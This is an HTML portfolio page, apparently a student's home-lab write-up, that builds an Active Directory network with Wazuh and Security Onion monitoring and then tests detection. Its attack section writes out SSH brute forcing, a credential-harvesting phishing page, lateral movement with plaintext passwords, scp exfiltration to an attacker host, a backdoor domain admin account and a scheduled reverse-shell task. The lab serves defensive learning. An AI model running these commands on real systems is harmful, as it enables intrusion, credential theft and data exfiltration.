@@ -1,0 +1,920 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="assets/css/main.css" />
+
+        <title>Enterprise Network Simulation</title>
+        <style>    
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                line-height: 1.6;
+                color: #ffffff;
+                max-width: 1300px;
+                margin: 0 auto;
+                padding: 20px;
+                background-color: #201f1f;
+            }
+            #wrapper {
+    max-width: 100%;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+#main {
+    width: 100%;
+    max-width: 1800px;
+    margin: 0 auto;
+}
+.inner {
+    padding: 20px;
+}
+#header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 0;
+    border-bottom: 1px solid #333;
+}
+.header-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+}
+.header-links {
+    display: flex;
+    gap: 2.5rem;
+}
+.header-links a {
+    white-space: nowrap;
+    font-size: 1.2em;
+    color: #ffffff;
+    text-decoration: none;
+    transition: color 0.3s ease;
+}
+.header-links a:hover {
+    color: #007bff;
+}
+            
+            h1 {
+        margin: 40px 0;
+        font-size: 3em;
+        text-align: center;
+        color: #51a3f5;
+    }
+            h1 {
+                margin: 0;
+                font-size: 2.5em;
+            }
+            h2 {
+                color: #51a3f5;
+                border-bottom: 2px solid #45aaee;
+                padding-bottom: 10px;
+                margin-top: 40px;
+            }
+            h3 {
+                color: #53aae4;
+            }
+            .container {
+            background-color: rgb(32, 32, 32);
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(31, 30, 30, 0.1);
+        }
+        code {
+            background-color: #333232;
+            border: 1px solid #424040;
+            border-radius: 4px;
+            padding: 2px 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        pre {
+            background-color: #292727;
+            border: 1px solid #1d1b1b;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+        }
+
+            
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin: 20px 0;
+            }
+            th, td {
+                border: 1px solid #ddd;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #222020;
+            }
+            .disclaimer {
+                background-color: #292928;
+                padding: 15px;
+                border-radius: 4px;
+                margin: 30px 0;
+                border-left: 4px solid #ef5350;
+            }
+            .note {
+                background-color: #292928;
+                padding: 15px;
+                border-radius: 4px;
+                margin: 20px 0;
+                border-left: 4px solid #66bb6a;
+            }
+            .highlight {
+                background-color: #292928;
+                padding: 20px;
+                border-left: 4px solid #ffd600;
+                margin: 20px 0;
+            }
+            .comparison {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 20px;
+                margin: 30px 0;
+            }
+            .comparison-col {
+                flex: 1;
+                min-width: 300px;
+                border: 1px solid #242121;
+                border-radius: 8px;
+                padding: 20px;
+                background-color: #201e1e;
+            }
+            .comparison-col h3 {
+                margin-top: 0;
+            }
+            .feature-list li {
+                margin-bottom: 10px;
+            }
+            .conclusion {
+                font-weight: 600;
+                font-style: italic;
+                margin: 30px 0;
+            }
+            .icons {
+    list-style-type: none;
+    padding: 0;
+    display: flex;
+    gap: 1rem;
+}
+.icons a {
+    font-size: 2.1em;
+    color: #4a4a4a;
+    transition: color 0.3s ease;
+}
+.icons a:hover {
+    color: #007bff;
+}
+.image-container {
+    margin: 40px 0;
+    text-align: center;
+}
+.image-container img {
+    max-width: 100%;
+    height: auto;
+    box-shadow: 0 4px 8px rgba(41, 41, 41, 0.1);
+}
+.diagram {
+            font-family: segoe UI;
+            margin: 20px auto;
+            max-width: 950px;
+        }
+        .block {
+            padding: 10px;
+            margin: 5px;
+            border: 2px solid #181818;
+            border-radius: 5px;
+            display: inline-block;
+            text-align: center;
+            vertical-align: middle;
+            background-color: #3d3d3d;
+            width: 220px;
+        }
+        .container {
+    border: 1px dashed #666;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 2px;
+    width: 275px; /* Fixed width for all containers */
+    box-sizing: border-box; /* Ensures padding doesn't add to width */
+}
+        .arrow {
+            font-size: 20px;
+            margin: 0 5px;
+        }
+        .flex-row {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .flex-column {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .connection {
+            font-size: 16px;
+            font-style: Segoe UI;
+        }
+            /* Responsive adjustments */
+@media screen and (max-width: 768px) {
+    body {
+        font-size: 16px;
+    }
+    #header {
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    .header-content {
+    flex-direction: column;
+    align-items: flex-start;
+    margin-top: -20px;  /* Move header upward by adjusting negative margin */
+    padding-bottom: 5px; /* Reduce padding if needed */
+}
+    .header-links {
+        flex-direction: column;
+        gap: 0.5rem;
+        margin-bottom: 0.5rem;
+    }
+    h1 {
+        font-size: 2em;
+    }
+}
+        </style>
+    </head>
+<body>
+    <!-- Wrapper -->
+    <div id="wrapper">
+        <!-- Main -->
+        <div id="main">
+            <div class="inner">
+                <!-- Header -->
+                <header id="header">
+                    <div class="header-content">
+                        <div class="header-links">
+                            <a href="index.html" class="logo" style="font-size: 20px;"><strong>Home</strong></a>
+                            <a href="#Projects.html" class="logo" style="font-size: 20px;"><strong>Projects</strong></a>
+                            <a href="#Writings.html" class="logo" style="font-size: 20px;"><strong>Writings</strong></a>
+                            <a href="#AboutMe.html" class="logo" style="font-size: 20px;"><strong>About me</strong></a>
+                            <style>
+                                .header-links {
+                                  padding-top: 5px; /* Adds space above the navigation */
+                                  /* or */
+                                  margin-top: 15px; /* Alternative approach */
+                                }
+                            </style>
+                        </div>
+                        <ul class="icons">
+                            <li><a href="https://www.linkedin.com/in/gautham-shridhar-bhandari/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
+                            <li><a href="https://github.com/gauthamsb777/gauthamsb777" class="icon brands fa-github"><span class="label">Github</span></a></li>
+                            <style>
+                                .icons {
+                                    padding-top: 5px; /* Adds space above the navigation */
+                                    /* or */
+                                    margin-top: 15px; /* Alternative approach */
+                                }
+                            </style>
+                            
+                        </ul>
+                    </div>
+                </header>
+                <br>
+                <h1>Enterprise Network Simulation</h1>
+                <br><br><br>
+    
+                    <p>This setup demonstrates enterprise network simulation with Active Directory, SIEM , and a simulated attack scenario. The environment consists of a domain controller, workstations, servers, security monitoring, and an attacker machine. The network is centered around a Windows Server 2025 as domain controller managing Active Directory for the domain "enter.corp.com". </p>
+                    
+                    
+                        <div class="diagram">
+                            <div class="flex-column">
+                                <h2>Network Architecture</h2>
+                                <!-- Network -->
+                                <div class="block">
+                                    <strong>NAT Network</strong><br>
+                                    10.0.0.0/24
+                                </div>
+                                
+                                <div>↓</div>
+                                
+                                <!-- Main Systems -->
+                                <div class="flex-row">
+                                    <!-- Infrastructure -->
+                                    <div class="container">
+                                        <h3>Central server</h3>
+                                        <div class="block">
+                                            <strong>Domain Controller</strong><br>
+                                            10.0.0.5<br>
+                                            Windows Server<br>
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - Active Directory<br>
+                                            - DNS Server<br>
+                                            - DHCP Server<br>
+                                            - File & Storage<br>
+                                            - Web Server
+                                            </small>
+                                        </div>
+                                        <div class="block">
+                                            <strong>Email Server</strong><br>
+                                            10.0.0.8<br>
+                                            Ubuntu
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - Postfix<br>
+                                            - Secure Chat
+                                            - Mailutils<br>
+                                            - Winbind ()
+                                            </small>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Client Systems -->
+                                    <div class="container">
+                                        <h3>Client System</h3>
+                                        <div class="block">
+                                            <strong>Windows Client</strong><br>
+                                            10.0.0.100<br>
+                                            Windows 11<br>
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - AD Domain Joined<br>
+                                            - Wazuh Agent<br>
+                                            - RDP Enabled
+                                            </small>
+                                        </div>
+                                        <div class="block">
+                                            <strong>Linux Client</strong><br>
+                                            10.0.0.101<br>
+                                            Ubuntu<br>
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - Winbind<br>
+                                            - Wazuh Agent<br>
+                                            - SSH Server
+                                            </small>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Security Systems -->
+                                    <div class="container">
+                                        <h3>Security and testing Systems</h3>
+                                        <div class="block">
+                                            <strong>Security Box</strong><br>
+                                            10.0.0.10<br>
+                                            Ubuntu<br>
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - Wazuh SIEM/XDR<br>
+                                            - Agent Management<br>
+                                            - Custom Alert Rules<br>
+                                            - File Integrity Monitoring
+                                            </small>
+                                        </div>
+                                        <div class="block">
+                                            <strong>Security Onion</strong><br>
+                                            10.0.0.103<br>
+                                            Security Onion<br>
+                                            <hr>
+                                            <small>
+                                            Services:<br>
+                                            - Network Monitoring<br>
+                                            - IDS/IPS<br>
+                                            - Packet Capture<br>
+                                            - Threat Detection
+                                            </small>
+                                        </div>
+                                        <div class="block">
+                                            <strong>Attacker machine</strong><br>
+                                            10.0.0.x<br>
+                                            Kali Linux<br>
+                                            <hr>
+                                            <small>
+                                            Tools:<br>
+                                            - Nmap<br>
+                                            - Hydra<br>
+                                            - Apache (Phishing)<br>
+                                            - Evil-WinRM
+                                            </small>
+                                        </div>
+                                    </div>
+                                </div>
+                    </div>
+                </section>
+                
+                    
+
+                    <div class="highlight">
+                        <h3>Authentication Model</h3>
+                        <p>All machines authenticate through Active Directory, including Linux clients via Winbind integration, providing a unified identity management system across the environment.</p>
+                    </div>
+                </section>
+
+                
+                    <h2>Domain Controller Configuration</h2>
+                    
+                    <h3>Initial Network Configuration</h3>
+                    <p>First, configure the static IP address for the domain controller:</p>
+                    <pre><code>IP: 10.0.0.5
+Subnet mask: 255.255.255.0
+Default gateway: 10.0.0.1
+Preferred DNS server: 127.0.0.1 (It will be its own DNS server)</code></pre>
+                    <br><br>
+                    <h3>Active Directory Setup</h3>
+                    <p></p>
+                    <ol> 
+                        <li>In server manager :</li>
+                        <pre><code>click on add roles and feature -> next -> in server role 
+- select Active Directory Domain Services, DHCP Server, DNS Server, File and Storage Services and Web Server -> 
+click next until confirmation page then -> click install  </code></pre>
+                        <li>Promote to domain controller, creating a new forest: enter.corp.com</li>
+                        <li>Set Directory Services Restore Mode (DSRM) password</li>
+                        <li>Configure default paths and options</li>
+                    </ol>
+                    
+                    <h3>DNS Configuration</h3>
+                    <p>Configure DNS forwarding to ensure proper name resolution:</p>
+                    <pre><code>Server Manager -> Tools -> DNS
+Right-click server -> Properties -> Forwarders tab
+Add forwarder: 8.8.8.8</code></pre>
+                    <br><br>
+
+                    <h3>DHCP Configuration</h3>
+                    <pre><code>Server Manager -> Tools -> DHCP
+Right-click IPv4 -> New Scope
+
+Name: project-x-scope
+IP Range: 10.0.0.100 - 10.0.0.200
+Subnet mask: 255.255.255.0
+Default Gateway: 10.0.0.1
+DNS Server: 10.0.0.5</code></pre>
+<br><br>
+<h3>Add Users and Roles</h3>
+
+Navigate to Server Manager -> Tools -> Active Directory Users and Computers -> right click on users to add user
+
+<pre><code>windows-client - john doe (user group)
+linux-client - jane doe (user group)
+email-server - email server (user group)
+sec-box - secuser (user group, admin group)
+</code></pre>
+
+                    <h2>Workstation & Server Configurations</h2>
+                    
+                    <h3>Windows Client Configuration</h3>
+                    <p>Configure the Windows 11 Enterprise client:</p>
+                    <ol>
+                        <li>Configure static IP: 10.0.0.100/24, DNS pointing to 10.0.0.5</li>
+                        <li>Join domain:
+                            <pre><code>search -> change workgroup name -> change
+Domain: enter.corp.com
+Enter the Credentials: johnd@enter.corp.com </code></pre>
+                        </li>
+                        
+                    </ol>
+                    
+                    <h3>Linux Client Configuration</h3>
+                    <p>Configure Ubuntu Desktop client to join Active Directory:</p>
+                    <ol>
+                        <li>Configure static IP: 10.0.0.101/24, DNS pointing to 10.0.0.5</li>
+                        <li>Install required packages:
+                            <pre><code>sudo apt update
+sudo apt -y install winbind libpam-winbind libnss-winbind krb5-config krb5-user samba-dsdb-modules samba-vfs-modules samba-common-bin adcli packagekit</code></pre>
+                        </li>
+                        <li>Configure Samba:
+                            <pre><code>sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.org
+
+ sudo nano /etc/samba/smb.conf</code></pre>
+                            Add the following configuration and edit realm and workgroup :
+                            <pre><code>[global]
+ kerberos method = secrets and keytab
+ realm = ENTER.CORP.COM
+ workgroup = ENTER
+ security = ads
+ template shell = /bin/bash
+ winbind enum groups = Yes
+ winbind enum users = Yes
+ winbind separator = +
+ idmap config * : rangesize = 1000000
+ idmap config * : range = 1000000-19999999
+ idmap config * : backend = autorid</code></pre>
+                        </li>
+                        <li>Configure Name Service Switch:
+                            <pre><code>sudo nano /etc/nsswitch.conf</code></pre>
+                            Add winbind in the end the passwd and group:
+                            <pre><code>passwd: files systemd winbind
+ group:  files systemd winbind
+</code></pre>
+                        </li>
+                        <li>Configure PAM for home directory creation:
+                            <pre><code>sudo pam-auth-update</code></pre>
+                            Enable "Create home directory on login" PAM profile
+                        </li>
+                        <li>Configure DNS and hosts:
+                            <pre><code>sudo nano /etc/resolv.conf
+# Add: nameserver 10.0.0.5
+</code></pre>
+                        </li>
+                        <li>Join domain:
+                            <pre><code>sudo net ads join -U Administrator</code></pre>
+                            Enter DC Admin password
+                        </li>
+                        <li>Restart winbind and verify:
+                            <pre><code>sudo systemctl restart winbind
+wbinfo -u # to list all domain users</code></pre>
+                        </li>
+                    </ol>
+                    
+                    <h3>Email Server Configuration</h3>
+                    <p>Configure the Ubuntu Server as an email server:</p>
+                    <ol>
+                        <li>Set hostname and static IP:
+                            <pre><code>sudo nano /etc/hostname
+# Change to: smtp.enter.corp.com
+
+sudo nano /etc/netplan/00-installer-config.yaml
+# Configure static IP: 10.0.0.8/24
+# DNS: 10.0.0.5, 8.8.8.8
+# Gateway: 10.0.0.1
+
+sudo netplan apply
+sudo reboot</code></pre>
+                        </li>
+                        <li>Join domain using the same Winbind configuration as Linux Client</li>
+                        <li>Install and configure Postfix:
+                            <pre><code>sudo apt update
+
+sudo DEBIAN_PRIORITY=low apt install postfix mailutils s-nail</code></pre>
+                            Select "Internet Site" and configure:
+                            <pre><code>System mail name: smtp.enter.corp.com
+Root recipient: email-server
+Destinations: smtp.enter.corp.com, localhost.localdomain, localhost
+Local networks: 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 10.0.0.0/24</code></pre>
+                        </li>
+                        <li>Configure Maildir:
+                            <pre><code>sudo postconf -e 'home_mailbox= Maildir/'
+sudo postconf -e 'virtual_alias_maps= hash:/etc/postfix/virtual'
+
+sudo nano /etc/postfix/virtual
+# Add: email-server.enter.corp.com email-server
+
+sudo postmap /etc/postfix/virtual
+
+sudo nano /etc/postfix/main.cf
+# Verify/add:
+myhostname = smtp.enter.corp.com
+mydomain = enter.corp.com
+mydestination = $myhostname, localhost.$mydomain, localhost
+mynetworks = 127.0.0.0/8 10.0.0.0/24 [::ffff:127.0.0.0]/104 [::1]/128
+home_mailbox = Maildir/
+virtual_alias_maps = hash:/etc/postfix/virtual
+
+sudo systemctl restart postfix
+sudo ufw allow Postfix</code></pre>
+                        </li>
+                        <li>Configure mail client:
+                            <pre><code>echo 'export MAIL=~/Maildir' | sudo tee -a /etc/bash.bashrc | sudo tee -a /etc/profile.d/mail.sh
+source /etc/profile.d/mail.sh
+
+sudo nano /etc/s-nail.rc
+# Add:
+set emptystart
+set folder=Maildir
+set record=+sent</code></pre>
+                        </li>
+                        <li>Configure DNS on DC:
+                            <pre><code># On DC: Add A record
+DNS -> Forward Lookup Zones -> enter.corp.com
+New Host (A) -> Name: smtp, IP: 10.0.0.8</code></pre>
+                        </li>
+                        <li>Setting up secure communication session</li>
+                    <pre>- Clone <a href="https://github.com/gauthamsb777/gauthamsb777/blob/main/Secure_chat_tool">Secure chat tool</a> used to host 
+  encrypted chat sessions:
+<code>git clone https://github.com/gauthamsb777/gauthamsb777.git</code></pre>
+                    </ol>
+
+                    <h3>Security Box Configuration</h3>
+                    <p>Configure the Ubuntu Desktop security monitoring system:</p>
+                    <ol>
+                        <li>Configure static IP: 10.0.0.10/24, DNS pointing to 10.0.0.5</li>
+                        <li>Join domain using the same Winbind configuration as Linux Client</li>
+                        <li>Install Wazuh (SIEM/XDR):
+                            <pre><code>sudo apt install curl
+
+curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash ./wazuh-install.sh -a -i</code></pre>
+                        </li>
+                    </ol>
+
+                    <h3>Security Onion Configuration</h3>
+                    <p>Configure Security Onion for network monitoring:</p>
+                    <ol>
+                        <li>Run post-install setup (after OS installation):
+                            <pre><code># Select Standalone mode
+# Hostname: project-x-sec-work
+# Static IP: 10.0.0.103/24
+# Gateway: 10.0.0.1
+# DNS: 10.0.0.5, 8.8.8.8
+# Search Domain: corp.project-x-dc.com
+# Installation Type: Standard
+# Add analyst IP range: 10.0.0.0/24</code></pre>
+                        </li>
+                    </ol>
+                </section>
+
+                
+                    <h2>Security Implementation</h2>
+                    
+                    <h3>Wazuh Agent Deployment</h3>
+                    <p>Deploy Wazuh agents to monitor all systems:</p>
+                    
+                    <h4>Windows (DC & Client)</h4>
+                    <pre><code>Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi -OutFile $env:tmp\wazuh-agent msiexec.exe /i $env:tmp\wazuh-agent /q WAZUH_MANAGER='10.0.0.10' WAZUH_AGENT_GROUP='default' WAZUH_AGENT_NAME='hostname'
+
+NET START WAZUH</code></pre>
+                    <br>
+                    <h4>Linux Client</h4>
+                    <pre><code>sudo wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.2-1_amd64.deb sudo WAZUH_MANAGER='10.0.0.10' WAZUH_AGENT_GROUP='default' WAZUH_AGENT_NAME='hostname' dpkg -i ./wazuh-agent_4.9.2-1_amd64.deb
+
+sudo systemctl daemon-reload
+
+sudo systemctl enable wazuh-agent
+
+sudo systemctl start wazuh-agent</code></pre>
+                    <br><br>
+                    <h3>Agent Group Configuration</h3>
+                    <p>Create and assign agent groups in Wazuh Dashboard:</p>
+                    <ol>
+                        <li>Create Linux and Windows groups</li>
+                        <li>Assign appropriate machines to each group</li>
+                        <li>Configure log collection for Windows:
+                            <pre><code>&lt;localfile&gt;
+  &lt;location&gt;Security&lt;/location&gt;
+  &lt;log_format&gt;eventchannel&lt;/log_format&gt;
+&lt;/localfile&gt;
+&lt;localfile&gt;
+  &lt;location&gt;Application&lt;/location&gt;
+  &lt;log_format&gt;eventchannel&lt;/log_format&gt;
+&lt;/localfile&gt;</code></pre>
+                        </li>
+                        <li>Configure log collection for Linux:
+                            <pre><code>&lt;localfile&gt;
+  &lt;log_format&gt;syslog&lt;/log_format&gt;
+  &lt;location&gt;/var/log/auth.log&lt;/location&gt;
+&lt;/localfile&gt;
+&lt;localfile&gt;
+  &lt;log_format&gt;syslog&lt;/log_format&gt;
+  &lt;location&gt;/var/log/secure&lt;/location&gt;
+&lt;/localfile&gt;
+&lt;localfile&gt;
+  &lt;log_format&gt;audit&lt;/log_format&gt;
+  &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
+&lt;/localfile&gt;</code></pre>
+                        </li>
+                    </ol>
+                    
+                    <h3>File Integrity Monitoring</h3>
+                    <p>Configure File Integrity Monitoring (FIM) for sensitive files:</p>
+                    <pre><code>&lt;syscheck&gt;
+  &lt;directories check_all="yes" report_changes="yes" realtime="yes"&gt;C:\Users\Administrator\Documents\Operations&lt;/directories&gt;
+  &lt;frequency&gt;60&lt;/frequency&gt;
+&lt;/syscheck&gt;</code></pre>
+                    <br><br>
+                    <h3>Custom Alert Rules</h3>
+                    <p>Configure custom alerts in Wazuh:</p>
+                    <p>Hamburger menu -> alerts -> monitor -> create monitor</p>
+                    <ol>
+                        <li>Failed SSH Monitoring:
+                            <pre><code>Name: Multiple Failed SSH Attempts
+Index: wazuh-alerts-*
+Time field: @timestamp
+</code>
+Add Data filter for better accuracy
+<code>Data filter: "decoder.name" is "sshd"
+<img src="assets/images/Data filter.png" alt="" />
+"rule.groups" contains "authencation_failed"
+<img src="assets/images/Data filter 1.png" alt="" />
+
+Trigger condition: when count is ABOVE 2</code></pre>
+                        </li>
+                        <li>WinRM Logon Monitoring:
+                            <pre><code>Index: wazuh-alerts-*
+
+ Data filter:
+"data.win.eventdata.logonProcessName" is "4624"
+"data.win.eventdata.logonProcessName" is "Kerberos"
+
+ Trigger when count is ABOVE 0</code></pre>
+                        </li>
+                        <li>Sensitive File Access:
+                            <pre><code># Add custom rule in local_rules.xml
+&lt;group name="syscheck,"&gt;
+  &lt;rule id="100002" level="10"&gt;
+    &lt;if_sid&gt;550&lt;/if_sid&gt;
+    &lt;field name="file"&gt;secrets.txt&lt;/field&gt;
+    &lt;match&gt;modified&lt;/match&gt;
+    &lt;description&gt;File integrity monitoring alert - access to confidential.txt file detected&lt;/description&gt;
+  &lt;/rule&gt;
+&lt;/group&gt;
+
+# Create monitor
+Name: File Accessed
+Index: wazuh-alerts-*
+
+Data filter: 
+"full.log" contains "confidential.txt"
+"syscheck.event" is "modified"
+
+Trigger when count is ABOVE 0
+</code></pre>
+                        </li>
+                    </ol>
+                </section>
+
+                
+                    <h2>Testing Detection Capabilites</h2>
+                    <p>The following vulnerabilities have been configured:</p>
+                    
+                    <h3>SSH Weak Configuration</h3>
+                    <p>On Email Server and Linux Client:</p>
+                    <pre><code>sudo nano /etc/ssh/sshd_config
+# Modify:
+PasswordAuthentication yes
+PermitRootLogin yes
+
+sudo systemctl restart ssh
+sudo passwd root # Set password to "november"</code></pre>
+                    <br><br>
+                    <h3>Insecure Windows Configuration</h3>
+                    <p>On Domain Controller:</p>
+                    <pre><code>local group policy editor -> network -> lanman workstation -> Enable insecure guest logons
+
+Run the following command in powershell :
+ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name AllowInsecureGuestAuth -Value 1 -Force
+
+# Enable RDP
+Settings -> System -> Remote Desktop -> Toggle On</code></pre>
+                    <br>
+                </section>
+
+                
+                    <h2>Attack Simulation & Detection</h2>
+                    
+                    <!-- Attack Flow -->
+                    <div class="container" style="width: 100%;">
+                        <h3>Attack Chain</h3>
+                        <div style="text-align: center;">
+                            Reconnaissance (Nmap) → Initial Access (SSH Brute Force) → Lateral Movement (WinRM) → 
+                            Privilege Escalation (Domain Admin) → Data Exfiltration (SCP) → Persistence (Scheduled Tasks)
+                        </div>
+                    </div>
+                    <h3>Reconnaissance</h3>
+                    <p>From the Kali attack machine:</p>
+                    <pre><code>nmap -p1-1000 -Pn -sV 10.0.0.0/24
+# Identify email-svr at 10.0.0.8 with SSH open
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
+# Should find root/november</code></pre>
+                    <br>
+                    <h3>Initial Access & Discovery</h3>
+                    <pre><code>ssh root@10.0.0.8
+# Password: november
+
+hostname
+ip a
+apt update && apt install net-tools nmap -y
+netstat -tuln
+nmap -sV 10.0.0.0/24
+# Identify all network hosts</code></pre>
+                    <br>
+                    <h3>Phishing Setup</h3>
+                    <p>On Attacker VM:</p>
+                    <pre><code>sudo apt update && sudo apt install apache2 git -y
+cd /var/www/html
+sudo rm index.html
+sudo git clone https://github.com/collinsmc23/projectsecurity-e101 .
+sudo touch creds.log
+sudo chmod 666 creds.log
+sudo systemctl start apache2</code></pre>
+                    
+                    <h3>Send Phishing Email</h3>
+                    <p>From the compromised Email Server:</p>
+                    <pre><code>nano email.txt
+# Add HTML email content with link to attacker IP
+
+cat email.txt | mail -a "Content-Type: text/html" -s "Important, Verify Password" janed@linux-client</code></pre>
+                    <br>
+                    <h3>Lateral Movement Chain</h3>
+                    <p>Movement from email server to Linux client to Windows client to Domain Controller:</p>
+                    
+                    <h4>Step 1: Linux Client Compromise</h4>
+                    <pre><code># Check captured credentials on Attacker VM
+cat /var/www/html/creds.log
+
+janed / password123@
+
+# Move to Linux Client
+ssh janed@10.0.0.101
+
+# Explore and discover WinRM on network
+nmap -Pn -p 5985,5986 -sV 10.0.0.0/24</code></pre>
+                    
+                    <h4>Step 2: Windows Client Compromise</h4>
+                    <pre><code># From Attacker VM
+# Try Administrator with various passwords
+echo "Administrator" > users.txt
+echo "We123telly@" > pass.txt
+nxc winrm 10.0.0.100 -u users.txt -p pass.txt
+
+# WinRM access
+evil-winrm -i 10.0.0.100 -u Administrator -p We123telly@
+hostname
+ipconfig
+nltest /dsgetdc: # Identify DC at 10.0.0.5</code></pre>
+                    
+                    <h4>Step 3: Domain Controller Compromise</h4>
+                    <pre><code># From Attacker VM
+xfreerdp /v:10.0.0.5 /u:Administrator /p:We123telly@ /d:enter.corp.com</code></pre>
+                    <br>
+                    <h3>Data Exfiltration</h3>
+                    <pre><code># On DC via RDP session (Command Prompt)
+scp "C:\Users\Administrator\Documents\Operations/confidential.txt" attacker@10.0.0.50:/home/attacker/my_exfil.txt</code></pre>
+                    <br>
+                    <h3>Persistence</h3>
+                    <p>The main goal of persistence is to maintain access to the system so attacker creates a backdoor: </p>
+                    <pre><code># On DC via RDP session
+
+net user corp-user @mysecurepassword1! /add /domain
+net localgroup Administrators corp-user /add
+net group "Domain Admins" corp-user /add /domain
+
+# Scheduled task for reverse shell
+schtasks /create /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc DAILY /st 12:00 /ru SYSTEM /f</code></pre>
+                </section>
+
+                
+                    <h2>Detection Results</h2>
+                    <img src="assets/images/Wazuh-alerts.png" alt="" />
+                    <div class="highlight">
+                        <h3>Key Detection Points</h3>
+                        <p>Throughout the attack simulation, the following activities would be detected by our security infrastructure:</p>
+                        <ul>
+                            <li>Failed SSH attempts during the brute force attack</li>
+                            <li>Successful root login to the Email Server</li>
+                            <li>Anomalous network scanning from compromised hosts</li>
+                            <li>WinRM authentication events</li>
+                            <li>Access to sensitive files in the monitored directory</li>
+                            <li>Creation of new domain admin accounts</li>
+                            <li>Scheduled task creation for persistence</li>
+                        </ul>
+                    </div>
+                    
+                    <p>These alerts would be visible in the Wazuh dashboard and Security Onion interfaces, allowing security personnel to detect and respond to the attack chain.</p>
+                </section>
+
+                
+                    <h2>Conclusion</h2>
+                    
+                    <p>Key takeways from this project: </p>
+                    <ul>
+                        <li>A enterprise domain with Windows and Linux clients bound together using Active directory</li>
+                        <li>An email server for internal communication</li>
+                        <li>Security monitoring via Wazuh SIEM and Security Onion</li>
+                        <li>Using logs and precise filters to accurately and effienciently detect attacks.</li>
+                        <li>Using secure chat tool to self host secure volatile chat-sessions for secure communication</li>
+                    </ul>
+                    
+                    <div class="note">
+                        <h3>Security Improvements</h3>
+                        <p>In a production environment, the following security measures would be recommended:</p>
+                        <ul>
+                            <li>Disable SSH root login and implement key-based authentication</li>
+                            <li>Implement proper password policies through Group Policy</li>
+                            <li>Implement Robust File integrity detection system</li>
+                            <li>Configure more sophisticated alerting with correlation rules</li>
+                            <li>Implement regular patching and vulnerability scanning</li>
+                            <li>Deploy application whitelisting on endpoints</li>
+                        </ul>
+                    </div>
+                    
+                </section>
+            </div>
+        </div>
+    </div>
+    <!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+    
+</body>
